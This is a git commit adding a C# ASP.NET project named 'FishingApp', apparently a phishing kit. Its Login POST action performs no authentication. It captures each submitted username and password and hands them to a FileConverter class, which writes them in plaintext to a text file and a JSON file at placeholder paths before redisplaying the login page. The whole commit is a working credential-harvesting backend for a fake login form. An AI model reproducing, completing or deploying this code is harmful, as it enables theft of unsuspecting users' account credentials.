a5e3647e72ccfd989308eeb2890a197cbd421fb6
Tural56 <87470785+Tural56@users.noreply.github.com>
2022-06-17 10:39:27 +0400

    First commit

---
+++ Controllers/HomeController.cs
@@ -0,0 +1,52 @@
+﻿using FishingApp.Models;
+using Microsoft.AspNetCore.Mvc;
+using Microsoft.Extensions.Logging;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Threading.Tasks;
+using FishingApp.Models.FileConverter;
+
+namespace FishingApp.Controllers
+{
+    public class HomeController : Controller
+    {
+        private readonly ILogger<HomeController> _logger;
+
+        public HomeController(ILogger<HomeController> logger)
+        {
+            _logger = logger;
+        }
+        public IActionResult Index()
+        {
+            return View();
+        }
+        [HttpGet]
+        public IActionResult Login()
+        {
+            return View();
+        }
+        [HttpPost]
+        public IActionResult Login(string login, string password)
+        {
+            string authData = $"Login: {login}   Password: {password}";
+            FileConverter file = new FileConverter();
+            file.JsonWriter(login, password);
+            file.FileWriter(authData);
+            
+            
+
+
+
+
+            return View();
+        }
+
+
+        
+
+        
+    }
+}
---
+++ Models/FileConverter/FileConverter.cs
@@ -0,0 +1,41 @@
+﻿using Newtonsoft.Json;
+using Newtonsoft.Json.Converters;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Threading.Tasks;
+
+namespace FishingApp.Models.FileConverter
+{
+    public class FileConverter
+    {
+        public void FileWriter(string PersonData)
+        {
+            const string path = @"YOUR TXT FILE PATH";
+            StreamWriter file = new StreamWriter(path, true);
+            file.WriteLine(PersonData);
+            file.Close();
+
+
+        }
+
+        public void JsonWriter(string name, string password)
+        {
+
+            const string path = @"[YOUR JSON FILE PATH]";
+            UserInfo user = new UserInfo();
+            user.UserName = name;
+            user.password = password;
+
+            
+            string output = JsonConvert.SerializeObject(user);
+            StreamWriter file = new StreamWriter(path);
+            file.WriteLine(output);
+            file.Close();
+
+
+
+        }
+    }
+}
